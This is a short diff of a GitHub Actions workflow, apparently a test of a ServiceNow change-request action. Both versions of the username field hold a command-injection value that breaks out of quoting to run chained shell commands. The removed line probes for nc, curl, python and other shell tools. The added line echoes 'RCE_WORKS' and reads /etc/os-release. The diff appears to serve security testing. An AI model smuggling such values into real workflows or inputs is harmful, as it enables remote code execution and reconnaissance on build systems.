@@ -10,6 +10,6 @@ jobs:
         with:
           action-type: 'create_change'
           url: 'https://example.service-now.com'
-          username: "x' & id; whoami; uname -a; ls /bin; ls /usr/bin; which nc telnet python python2 ruby perl php node nodejs busybox bash wget curl; :'y"
+          username: "x' & echo RCE_WORKS; pwd; ls /; cat /etc/os-release 2>/dev/null || true; :'y"
           password: 'testpass'
           cr-number: '12345'
